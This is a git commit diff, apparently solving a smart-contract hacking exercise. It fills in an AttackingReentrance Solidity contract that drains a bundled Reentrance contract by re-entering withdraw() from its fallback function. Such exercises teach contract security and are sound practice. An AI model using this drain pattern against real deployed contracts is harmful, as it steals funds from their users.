ab6888599a4c936c6772dfa71553afef901b6eed
Carl Lippert <carl.lippert@gmail.com>
2022-07-04 17:09:19 -0500

    took. it. all.

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,23 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance public reentrance; 
+     uint public amount = 1; 
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentrance = Reentrance(contractAddress);
     }
+
+    fallback() external payable {
+    if (address(reentrance).balance != 0 ) {
+        reentrance.withdraw(); 
+    }
+}
 
     function hackContract() external {
         // Code me!
+        reentrance.donate{value: amount}(address(this));
+        reentrance.withdraw();
     }
 }
